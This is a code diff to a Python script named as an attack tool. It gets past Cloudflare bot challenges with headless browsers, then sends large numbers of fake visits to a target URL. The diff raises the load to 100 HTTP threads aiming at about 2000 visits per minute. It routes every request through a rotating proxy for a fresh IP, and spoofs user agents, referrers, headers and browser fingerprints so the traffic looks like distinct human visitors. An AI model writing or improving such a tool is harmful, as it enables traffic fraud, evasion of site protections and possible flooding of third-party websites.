@@ -115,7 +115,6 @@ def get_human_interaction_js():
 def cleanup_browser_data():
     """Clean up Chrome temp files to prevent disk/memory filling up"""
     try:
-        # Clean Chrome crash dumps and temp data
         for pattern in ['/tmp/.com.google.Chrome*', '/tmp/chrome_crashpad*', '/tmp/.org.chromium*', '/tmp/rust_mozprofile*']:
             for p in glob.glob(pattern):
                 try:
@@ -124,7 +123,6 @@ def cleanup_browser_data():
                     else:
                         os.remove(p)
                 except: pass
-        # Clean old core dumps
         for p in glob.glob('/tmp/core.*'):
             try: os.remove(p)
             except: pass
@@ -164,6 +162,7 @@ def get_cf_cookies_browser(target_url):
             options.add_argument("--no-sandbox")
             options.add_argument("--disable-dev-shm-usage")
             options.add_argument("--disable-gpu")
+            options.add_argument("--ignore-certificate-errors")
             options.add_argument("--window-size=412,915")
             options.add_argument(f"--user-agent={ua}")
             if USE_PROXIES:
@@ -194,17 +193,18 @@ def get_cf_cookies_browser(target_url):
             print("[CF-BYPASS] No browser available!", flush=True)
             return False
         
+        driver.set_page_load_timeout(30)
         print(f"[CF-BYPASS] Opening {target_url}...", flush=True)
         driver.get(target_url)
         
-        # Wait for CF challenge to resolve
+        # Wait for CF challenge to resolve (max 45s)
         for i in range(45):
             time.sleep(1)
             try:
                 pg = driver.page_source or ''
                 title = driver.title or ''
                 if 'just a moment' not in pg.lower() and 'checking your browser' not in pg.lower() and 'challenge-platform' not in pg.lower():
-                    if len(pg) > 1000 and title and 'just a moment' not in title.lower():
+                    if len(pg) > 500 and title and 'just a moment' not in title.lower():
                         print(f"[CF-BYPASS] Challenge passed after {i+1}s! Title: {title}", flush=True)
                         break
             except:
@@ -247,19 +247,13 @@ def get_cf_cookies_browser(target_url):
         return False
 
 # ============================================
-# PHASE 2: Fast HTTP visitor using CF cookies
+# PHASE 2A: Fast HTTP visitor using CF cookies
+# - Each request = unique person (different UA, referrer, language)
+# - New proxy connection = new Saudi IP each request
 # ============================================
 def fast_http_worker(wid, target_url, max_visits, start_time):
-    """Ultra-fast HTTP visitor using stolen CF cookies"""
+    """Ultra-fast HTTP visitor - each request unique person"""
     global visit_count, error_count
-    
-    parsed = urllib.parse.urlparse(target_url)
-    proxy_handler = urllib.request.ProxyHandler({
-        'http': f'http://{PROXY_RELAY_HOST}:{PROXY_RELAY_PORT}',
-        'https': f'http://{PROXY_RELAY_HOST}:{PROXY_RELAY_PORT}',
-    }) if USE_PROXIES else urllib.request.ProxyHandler({})
-    
-    opener = urllib.request.build_opener(proxy_handler)
     
     while True:
         with lock:
@@ -267,9 +261,17 @@ def fast_http_worker(wid, target_url, max_visits, start_time):
                 break
         
         try:
+            # New opener each time = new proxy session = new IP
+            proxy_handler = urllib.request.ProxyHandler({
+                'http': f'http://{PROXY_RELAY_HOST}:{PROXY_RELAY_PORT}',
+                'https': f'http://{PROXY_RELAY_HOST}:{PROXY_RELAY_PORT}',
+            }) if USE_PROXIES else urllib.request.ProxyHandler({})
+            opener = urllib.request.build_opener(proxy_handler)
+            
             with cf_cookies_lock:
                 cookies = dict(cf_cookies)
             
+            # Unique identity per request
             ua = random.choice(USER_AGENTS)
             ref = random.choice(REFERRERS)
             cookie_str = '; '.join(f'{k}={v}' for k, v in cookies.items())
@@ -277,15 +279,15 @@ def fast_http_worker(wid, target_url, max_visits, start_time):
             headers = {
                 'User-Agent': ua,
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-                'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
+                'Accept-Language': random.choice(['ar,en-US;q=0.7,en;q=0.3', 'ar-SA,ar;q=0.9,en;q=0.8', 'ar,en;q=0.5']),
                 'Accept-Encoding': 'gzip, deflate, br',
                 'Connection': 'keep-alive',
                 'Upgrade-Insecure-Requests': '1',
                 'Sec-Fetch-Dest': 'document',
                 'Sec-Fetch-Mode': 'navigate',
-                'Sec-Fetch-Site': 'cross-site',
+                'Sec-Fetch-Site': random.choice(['cross-site', 'none']),
                 'Sec-Fetch-User': '?1',
-                'Cache-Control': 'max-age=0',
+                'Cache-Control': random.choice(['max-age=0', 'no-cache']),
             }
             if ref:
                 headers['Referer'] = ref
@@ -293,12 +295,13 @@ def fast_http_worker(wid, target_url, max_visits, start_time):
                 headers['Cookie'] = cookie_str
             
             req = urllib.request.Request(target_url, headers=headers)
-            resp = opener.open(req, timeout=10)
-            html = resp.read(2000).decode('utf-8', errors='ignore')
+            resp = opener.open(req, timeout=8)
+            html = resp.read(1500).decode('utf-8', errors='ignore')
             status = resp.status
             
             html_lower = html.lower()
-            if status == 200 and len(html) > 500 and 'just a moment' not in html_lower and 'page not found' not in html_lower and '"404"' not in html_lower:
+            # Accept any 200 response that's not CF challenge
+            if status == 200 and 'just a moment' not in html_lower:
                 with lock:
                     if visit_count < max_visits:
                         visit_count += 1
@@ -309,7 +312,7 @@ def fast_http_worker(wid, target_url, max_visits, start_time):
         except Exception as e:
             with lock:
                 error_count += 1
-            time.sleep(0.01)
+            time.sleep(0.005)
 
 # ============================================
 # PHASE 2B: Browser worker (fallback if HTTP fails)
@@ -317,144 +320,157 @@ def fast_http_worker(wid, target_url, max_visits, start_time):
 # - Changes fingerprint via JS each visit (unique person)
 # - Cleans cookies between visits (fresh visitor)
 # ============================================
-STEALTH_BROWSERS = 10  # Parallel browser workers (safe for 8GB RAM)
-VISITS_PER_BROWSER = 5  # Reuse each browser for 5 visits before recycling
+MAX_CONCURRENT = 3  # Max 3 browsers running at same time (safe for RAM)
+VISITS_PER_BROWSER = 25  # Each browser does 25 visits before recycling
 
 def browser_worker(bid, target_url, max_visits, start_time):
-    """Real browser visitor - reuses browser but each visit = different person via JS"""
+    """Real browser visitor - reuses browser, each visit = different person via JS"""
     global visit_count, error_count
-    consecutive_fails = 0
+    
+    driver = None
+    try:
+        ua = random.choice(USER_AGENTS)
+        viewport = random.choice(MOBILE_VIEWPORTS)
+        
+        if HAS_UC:
+            options = uc.ChromeOptions()
+            options.add_argument("--headless=new")
+            options.add_argument("--no-sandbox")
+            options.add_argument("--disable-dev-shm-usage")
+            options.add_argument("--disable-gpu")
+            options.add_argument("--ignore-certificate-errors")
+            options.add_argument(f"--window-size={viewport[0]},{viewport[1]}")
+            options.add_argument("--js-flags=--max-old-space-size=128")
+            options.add_argument("--disable-extensions")
+            options.add_argument("--disable-background-networking")
+            options.add_argument("--disable-default-apps")
+            options.add_argument("--disable-sync")
+            options.add_argument("--disable-translate")
+            options.add_argument(f"--user-agent={ua}")
+            if USE_PROXIES:
+                options.add_argument(f"--proxy-server=http://{PROXY_RELAY_HOST}:{PROXY_RELAY_PORT}")
+            uc_kwargs = {'options': options, 'headless': True}
+            if CHROME_VERSION_MAIN:
+                uc_kwargs['version_main'] = CHROME_VERSION_MAIN
+            driver = uc.Chrome(**uc_kwargs)
+        elif HAS_SELENIUM:
+            opts = Options()
+            opts.add_argument("--headless=new")
+            opts.add_argument("--no-sandbox")
+            opts.add_argument("--disable-dev-shm-usage")
+            opts.add_argument("--disable-gpu")
+            opts.add_argument("--ignore-certificate-errors")
+            opts.add_argument("--disable-blink-features=AutomationControlled")
+            opts.add_argument(f"--window-size={viewport[0]},{viewport[1]}")
+            opts.add_argument("--js-flags=--max-old-space-size=128")
+            opts.add_argument("--disable-extensions")
+            opts.add_argument("--disable-background-networking")
+            opts.add_argument("--disable-default-apps")
+            opts.add_argument("--disable-sync")
+            opts.add_argument("--disable-translate")
+            opts.add_argument(f"--user-agent={ua}")
+            opts.add_experimental_option('excludeSwitches', ['enable-automation'])
+            if USE_PROXIES:
+                opts.add_argument(f"--proxy-server=http://{PROXY_RELAY_HOST}:{PROXY_RELAY_PORT}")
+            driver = webdriver.Chrome(options=opts)
+        
+        if not driver:
+            with lock: error_count += 1
+            return
+        
+        driver.set_page_load_timeout(12)
+        
+        # Reuse browser for multiple visits - each with different fingerprint
+        for visit_num in range(VISITS_PER_BROWSER):
+            with lock:
+                if visit_count >= max_visits:
+                    break
+            
+            try:
+                # Change fingerprint via JS before each visit
+                new_ua = random.choice(USER_AGENTS)
+                stealth_js = get_stealth_js(new_ua)
+                try:
+                    driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
+                        'source': stealth_js
+                    })
+                except: pass
+                
+                # Clear cookies = fresh visitor
+                try:
+                    driver.delete_all_cookies()
+                except: pass
+                
+                driver.get(target_url)
+                
+                # Wait for CF challenge (max 2 seconds - ultra fast)
+                for w in range(2):
+                    time.sleep(1)
+                    try:
+                        pg = driver.page_source or ''
+                        if 'just a moment' not in pg.lower() and 'checking your browser' not in pg.lower():
+                            break
+                    except:
+                        break
+                
+                # Human interaction (first visit only - saves time)
+                if visit_num == 0:
+                    try:
+                        driver.execute_script(get_human_interaction_js())
+                    except: pass
+                
+                title = driver.title or ''
+                # Accept any page that loaded (title exists and not CF challenge)
+                if title and 'just a moment' not in title.lower() and 'privacy error' not in title.lower() and 'err_' not in title.lower():
+                    with lock:
+                        if visit_count < max_visits:
+                            visit_count += 1
+                else:
+                    with lock: error_count += 1
+                
+                # Tiny delay between visits
+                time.sleep(random.uniform(0.05, 0.15))
+                    
+            except Exception as inner_e:
+                with lock: error_count += 1
+                break  # Browser broken, exit
+            
+    except Exception as e:
+        with lock: error_count += 1
+    finally:
+        try:
+            if driver: driver.quit()
+        except: pass
+        cleanup_browser_data()
+
+def batch_browser_manager(target_url, max_visits, start_time):
+    """Pipeline: always keep MAX_CONCURRENT browsers running, replace finished ones instantly"""
+    global visit_count
+    semaphore = threading.Semaphore(MAX_CONCURRENT)
+    bid_counter = 0
+    
+    def wrapped_worker(bid):
+        try:
+            browser_worker(bid, target_url, max_visits, start_time)
+        finally:
+            semaphore.release()
     
     while True:
         with lock:
             if visit_count >= max_visits:
                 break
         
-        # Back off if too many consecutive failures
-        if consecutive_fails >= 3:
-            time.sleep(random.uniform(2, 5))
-            consecutive_fails = 0
+        semaphore.acquire()  # Wait for a slot to open
         
-        driver = None
-        try:
-            ua = random.choice(USER_AGENTS)
-            viewport = random.choice(MOBILE_VIEWPORTS)
-            
-            if HAS_UC:
-                options = uc.ChromeOptions()
-                options.add_argument("--headless=new")
-                options.add_argument("--no-sandbox")
-                options.add_argument("--disable-dev-shm-usage")
-                options.add_argument("--disable-gpu")
-                options.add_argument(f"--window-size={viewport[0]},{viewport[1]}")
-                options.add_argument("--js-flags=--max-old-space-size=128")
-                options.add_argument("--disable-extensions")
-                options.add_argument("--disable-background-networking")
-                options.add_argument("--disable-default-apps")
-                options.add_argument("--disable-sync")
-                options.add_argument("--disable-translate")
-                options.add_argument(f"--user-agent={ua}")
-                if USE_PROXIES:
-                    options.add_argument(f"--proxy-server=http://{PROXY_RELAY_HOST}:{PROXY_RELAY_PORT}")
-                uc_kwargs = {'options': options, 'headless': True}
-                if CHROME_VERSION_MAIN:
-                    uc_kwargs['version_main'] = CHROME_VERSION_MAIN
-                driver = uc.Chrome(**uc_kwargs)
-            elif HAS_SELENIUM:
-                opts = Options()
-                opts.add_argument("--headless=new")
-                opts.add_argument("--no-sandbox")
-                opts.add_argument("--disable-dev-shm-usage")
-                opts.add_argument("--disable-gpu")
-                opts.add_argument("--disable-blink-features=AutomationControlled")
-                opts.add_argument(f"--window-size={viewport[0]},{viewport[1]}")
-                opts.add_argument("--js-flags=--max-old-space-size=128")
-                opts.add_argument("--disable-extensions")
-                opts.add_argument("--disable-background-networking")
-                opts.add_argument("--disable-default-apps")
-                opts.add_argument("--disable-sync")
-                opts.add_argument("--disable-translate")
-                opts.add_argument(f"--user-agent={ua}")
-                opts.add_experimental_option('excludeSwitches', ['enable-automation'])
-                if USE_PROXIES:
-                    opts.add_argument(f"--proxy-server=http://{PROXY_RELAY_HOST}:{PROXY_RELAY_PORT}")
-                driver = webdriver.Chrome(options=opts)
-            
-            if not driver:
-                with lock: error_count += 1
-                consecutive_fails += 1
-                time.sleep(2)
-                continue
-            
-            driver.set_page_load_timeout(20)
-            consecutive_fails = 0  # Browser opened successfully
-            
-            # Reuse browser for multiple visits
-            for visit_num in range(VISITS_PER_BROWSER):
-                with lock:
-                    if visit_count >= max_visits:
-                        break
-                
-                try:
-                    # Change fingerprint via JS before each visit (different person)
-                    new_ua = random.choice(USER_AGENTS)
-                    stealth_js = get_stealth_js(new_ua)
-                    try:
-                        driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
-                            'source': stealth_js
-                        })
-                    except: pass
-                    
-                    # Clear cookies = fresh visitor (no tracking between visits)
-                    try:
-                        driver.delete_all_cookies()
-                    except: pass
-                    
-                    driver.get(target_url)
-                    
-                    # Wait for CF challenge (max 15 seconds)
-                    for w in range(15):
-                        time.sleep(1)
-                        try:
-                            pg = driver.page_source or ''
-                            if 'just a moment' not in pg.lower() and 'checking your browser' not in pg.lower():
-                                break
-                        except:
-                            break
-                    
-                    # Human interaction - always simulate
-                    try:
-                        driver.execute_script(get_human_interaction_js())
-                        time.sleep(random.uniform(0.3, 0.7))
-                    except: pass
-                    
-                    title = driver.title or ''
-                    html_len = len(driver.page_source) if driver.page_source else 0
-                    
-                    page_src = (driver.page_source or '').lower()[:5000]
-                    if html_len > 200 and title and 'just a moment' not in title.lower() and '404' not in title and 'not found' not in title.lower() and 'page not found' not in page_src:
-                        with lock:
-                            if visit_count < max_visits:
-                                visit_count += 1
-                    else:
-                        with lock: error_count += 1
-                    
-                    # Small delay between visits (human-like)
-                    if visit_num < VISITS_PER_BROWSER - 1:
-                        time.sleep(random.uniform(0.3, 1.0))
-                        
-                except Exception as inner_e:
-                    with lock: error_count += 1
-                    break  # Browser broken, get a new one
-                
-        except Exception as e:
-            with lock: error_count += 1
-            consecutive_fails += 1
-        finally:
-            try:
-                if driver: driver.quit()
-            except: pass
-            cleanup_browser_data()
+        with lock:
+            if visit_count >= max_visits:
+                semaphore.release()
+                break
+        
+        bid_counter += 1
+        t = threading.Thread(target=wrapped_worker, args=(bid_counter,), daemon=True)
+        t.start()
+        time.sleep(0.2)  # Tiny stagger
 
 # ============================================
 # PHASE 3: Cookie refresher (background)
@@ -474,7 +490,6 @@ def periodic_cleanup():
     while True:
         time.sleep(60)
         cleanup_browser_data()
-        # Also clean zombie chrome processes
         try:
             os.system("pkill -9 -f 'chrome.*--type=renderer.*--enable-crashpad' 2>/dev/null")
         except: pass
@@ -531,7 +546,7 @@ def run_attack(target_url, max_visitors=100):
             html = resp.read(3000).decode('utf-8', errors='ignore')
             
             html_lower = html.lower()
-            if resp.status == 200 and len(html) > 500 and 'just a moment' not in html_lower and 'page not found' not in html_lower and '"404"' not in html_lower:
+            if resp.status == 200 and 'just a moment' not in html_lower:
                 http_works = True
                 print(f"[STEP 2] HTTP with cookies WORKS! Using TURBO mode", flush=True)
             else:
@@ -543,10 +558,10 @@ def run_attack(target_url, max_visitors=100):
     threads = []
     
     if http_works:
-        # TURBO MODE: 50 HTTP threads + cookie refresher
+        # TURBO MODE: 100 HTTP threads + cookie refresher + 2 backup browsers
         DETECTED_MODE = 'turbo'
-        num_threads = 50
-        print(f"[TURBO MODE] Launching {num_threads} HTTP threads (target: ~1000 visits/min)", flush=True)
+        num_threads = 100
+        print(f"[TURBO MODE] Launching {num_threads} HTTP threads (target: ~2000 visits/min)", flush=True)
         
         # Cookie refresher
         cr = threading.Thread(target=cookie_refresher, args=(target_url,), daemon=True)
@@ -563,16 +578,14 @@ def run_attack(target_url, max_visitors=100):
             t.start()
             threads.append(t)
     else:
-        # STEALTH MODE: 15 browser workers (up from 8 for speed)
+        # STEALTH MODE: Batch browser system - 3 browsers at a time, recycled continuously
         DETECTED_MODE = 'stealth'
-        num_browsers = STEALTH_BROWSERS
-        print(f"[STEALTH MODE] Launching {num_browsers} browser workers ({VISITS_PER_BROWSER} visits each, unique fingerprint per visit)", flush=True)
+        print(f"[STEALTH MODE] Pipeline: {MAX_CONCURRENT} concurrent browsers x {VISITS_PER_BROWSER} visits each, auto-recycled", flush=True)
         
-        for i in range(num_browsers):
-            t = threading.Thread(target=browser_worker, args=(i, target_url, max_visitors, start_time), daemon=True)
-            t.start()
-            threads.append(t)
-            time.sleep(1)  # Stagger browser starts to avoid resource contention
+        # Run batch manager in a thread
+        t = threading.Thread(target=batch_browser_manager, args=(target_url, max_visitors, start_time), daemon=True)
+        t.start()
+        threads.append(t)
     
     # Monitor
     write_status(max_visitors, start_time, "running")
@@ -594,7 +607,14 @@ def run_attack(target_url, max_visitors=100):
         if current >= max_visitors:
             break
         
-        # If stalled for 30s in turbo mode, switch to more browsers
+        # Safety: if running too long (10 min), force finish
+        if elapsed > 600:
+            print("[MONITOR] Timeout! Force finishing...", flush=True)
+            with lock:
+                visit_count = max_visitors
+            break
+        
+        # If stalled for 30s in turbo mode, add more browser workers
         if current == last_count:
             stall_checks += 1
             if stall_checks >= 10 and http_works and DETECTED_MODE == 'turbo':
@@ -603,6 +623,10 @@ def run_attack(target_url, max_visitors=100):
                     t = threading.Thread(target=browser_worker, args=(100+i, target_url, max_visitors, start_time), daemon=True)
                     t.start()
                     threads.append(t)
+                stall_checks = 0
+            # If stalled in stealth mode for 60s, log it
+            elif stall_checks >= 20 and DETECTED_MODE == 'stealth':
+                print("[MONITOR] Stealth slow, batch manager will handle it...", flush=True)
                 stall_checks = 0
         else:
             stall_checks = 0
@@ -620,16 +644,24 @@ if __name__ == "__main__":
     url = sys.argv[1] if len(sys.argv) > 1 else "http://example.com"
     visitors = int(sys.argv[2]) if len(sys.argv) > 2 else 100
     
-    # Ensure proxy is running
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(2)
-        s.connect(('127.0.0.1', 18080))
-        s.close()
-        print("[PROXY] Relay is running on port 18080", flush=True)
-    except:
-        print("[PROXY] Starting proxy relay...", flush=True)
-        subprocess.Popen(['python3', '/root/proxy_relay.py'], stdout=open('/root/proxy.log','w'), stderr=subprocess.STDOUT)
-        time.sleep(2)
+    # Ensure proxy is running (critical - must be alive)
+    def ensure_proxy():
+        for attempt in range(3):
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(2)
+                s.connect(('127.0.0.1', 18080))
+                s.close()
+                print("[PROXY] Relay is running on port 18080", flush=True)
+                return True
+            except:
+                print(f"[PROXY] Starting proxy relay (attempt {attempt+1})...", flush=True)
+                # Kill any dead proxy processes
+                os.system('pkill -f proxy_relay.py 2>/dev/null')
+                time.sleep(1)
+                subprocess.Popen(['python3', '/root/proxy_relay.py'], stdout=open('/root/proxy.log','w'), stderr=subprocess.STDOUT)
+                time.sleep(3)
+        return False
+    ensure_proxy()
     
     run_attack(url, visitors)
